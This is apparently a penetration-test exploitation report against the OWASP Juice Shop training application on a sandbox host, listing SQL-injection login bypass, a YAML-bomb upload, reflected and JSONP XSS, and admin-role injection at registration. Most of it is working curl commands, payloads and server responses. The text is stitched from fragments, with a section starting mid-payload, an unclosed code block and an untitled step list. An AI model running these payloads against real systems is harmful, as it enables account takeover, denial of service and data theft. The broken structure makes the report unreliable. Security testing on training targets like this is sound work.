- **Overview:** Direct string interpolation in SQL query enables complete authentication bypass
- **Impact:** Administrative access bypass, complete system compromise
- **Severity:** Critical

**Prerequisites:**
None - publicly accessible endpoint

**Exploitation Steps:**

1. Send POST request to login endpoint with SQL injection payload in email field:
```bash
curl -X POST http://juice-shop.sandbox.local:3001/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR '\''1'\''='\''1'\'' --","password":"test"}'
```

2. Receive admin JWT token and user details:
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

**Proof of Impact:**
Successfully bypassed authentication and obtained admin-level access token for user ID 1 (admin@juice-sh.op) with role "admin". This provides complete administrative access to the application.

**Notes:**
The vulnerability exists due to direct string interpolation in SQL query construction at `/routes/login.ts:34`. The email field accepts arbitrary SQL commands allowing complete database access.

### INJ-VULN-02: SQL Injection Data Extraction

c: &c [*b,*b,*b,*b,*b]
```

2. Upload YAML bomb:
```bash
curl -X POST "http://juice-shop.sandbox.local:3001/file-upload" \
  -H "Authorization: Bearer [TOKEN]" \
  -F "file=@yaml_bomb.yml"
```

**Proof of Impact:**
Successfully triggered exponential object expansion visible in error response showing nested array structure expanding as designed. The YAML bomb consumed server resources through anchor/reference expansion.

**Notes:**
Vulnerability exists due to unsafe yaml.load() method usage instead of yaml.safeLoad() in js-yaml library.


# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in Search Parameter (Angular Security Bypass)

**Summary:**
- **Vulnerable location:** http://juice-shop.sandbox.local:3001/#/search?q=[PAYLOAD]
- **Overview:** Search query parameter directly processed through Angular's bypassSecurityTrustHtml() function without sanitization
- **Impact:** Immediate JavaScript execution in victim's browser, session token access, potential for phishing and data theft
- **Severity:** Medium

**Prerequisites:**
None - publicly accessible without authentication

**Exploitation Steps:**
1. Navigate to: `http://juice-shop.sandbox.local:3001/#/search?q=<img src=x onerror=alert('XSS')>`
2. Observe immediate JavaScript execution via alert dialog

**Proof of Impact:**
Successfully achieved JavaScript execution as evidenced by alert dialog displaying "XSS" message. The payload `<img src=x onerror=alert('XSS')>` was injected into the search parameter and executed without any sanitization.

**Notes:**
This vulnerability can be used for session hijacking by replacing the alert with cookie exfiltration code. The attack works because Angular's bypassSecurityTrustHtml() method explicitly bypasses XSS protection for search result display.

### XSS-VULN-02: JSONP Callback XSS

**Summary:**
- **Vulnerable location:** http://juice-shop.sandbox.local:3001/rest/user/whoami?callback=[PAYLOAD]

- **Impact:** Cross-domain JavaScript execution, data exfiltration, bypass of same-origin policy
- **Severity:** Medium

**Prerequisites:**
None - endpoint accessible without authentication

**Exploitation Steps:**
1. From any web page context, create a script tag targeting the vulnerable endpoint:
```javascript
const script = document.createElement('script');
script.src = '/rest/user/whoami?callback=alert';
document.head.appendChild(script);
```
2. Observe JavaScript execution via alert dialog with user data object

**Proof of Impact:**
Successfully achieved JavaScript execution as evidenced by alert dialog displaying "[object Object]" containing user data. The JSONP endpoint generates response format: `/**/ typeof alert === 'function' && alert({"user":{}});` which executes the injected callback function.

**Notes:**
This vulnerability enables cross-domain attacks and can be used to exfiltrate user data from the JSONP endpoint. Attackers can host malicious pages that include this endpoint as a script source to steal user information.

1. Register as regular customer:
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/api/Users" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "regular@user.com",
    "password": "Password123!",
    "passwordRepeat": "Password123!"
  }'
```

2. Login to obtain customer token:
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "regular@user.com",
    "password": "Password123!"
  }'
```

3. Create product using customer token:
```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/api/Products" \
  -H "Authorization: Bearer [CUSTOMER_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Hacked Product by Regular User",
    "description": "This product was created by a regular customer account - proving authorization bypass!",
    "price": 999.99,
    "image": "malicious.jpg"
  }'

### AUTHZ-VULN-10: Registration Workflow Bypass for Admin Access

**Summary:**
- **Vulnerable location:** POST /api/Users endpoint (registration workflow)
- **Overview:** Bypass intended registration validation steps to gain admin privileges
- **Impact:** Complete privilege escalation by skipping security validations
- **Severity:** Critical

**Prerequisites:**
None - exploits public registration endpoint

**Exploitation Steps:**

This vulnerability is demonstrated by the same exploitation as AUTHZ-VULN-06, where admin role injection bypasses the intended registration workflow that should include:
- Email verification steps
- Security question validation
- Admin approval processes
- Multi-step validation workflow

The exploit directly injects admin role without completing any validation steps:

```bash
curl -s -i -X POST "http://juice-shop.sandbox.local:3001/api/Users" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "workflow-bypass@evil.com",
    "password": "Password123!",
    "passwordRepeat": "Password123!",
    "role": "admin"
  }'
```

**Proof of Impact:**
- **Workflow bypass** - no email verification, captcha, or sequential validation required
- **Admin privileges obtained** without any approval or validation process
- **Security controls circumvented** - intended multi-step registration process skipped
- **Direct privilege injection** bypassing all intended security workflows

---

**AUTHZ EXPLOITATION COMPLETE**

All 10 authorization vulnerabilities have been successfully exploited with concrete evidence of unauthorized access, privilege escalation, and workflow bypasses. The application demonstrates systemic authorization failures across horizontal privilege escalation (IDOR), vertical privilege escalation (role injection), and context-based workflow bypasses.
